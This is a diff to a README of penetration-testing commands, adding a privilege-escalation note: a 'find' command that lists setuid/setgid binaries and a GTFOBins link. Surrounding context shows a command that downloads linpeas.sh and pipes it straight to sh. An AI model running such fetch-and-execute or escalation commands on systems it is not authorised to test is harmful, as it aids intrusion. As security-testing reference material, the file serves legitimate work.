@@ -1,6 +1,10 @@
 # HackCmds
 Collection of useful penetration testing and hacking commands.
 
+[Aller à "Ma Section"](#privilege-escalation)
+[Aller à "Ma Section"](#privilege-escalation)
+
+
 ----
 
 ## Scanning
@@ -73,6 +77,15 @@ run
 ````
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ````
+
+- Find bin with setuid or setgid activated
+````
+find / -perm +6000 2>/dev/null | grep '/bin/'
+````
+
+- Usefull link :
+
+[GTFOBINS](https://gtfobins.github.io/)
 
 ---
 
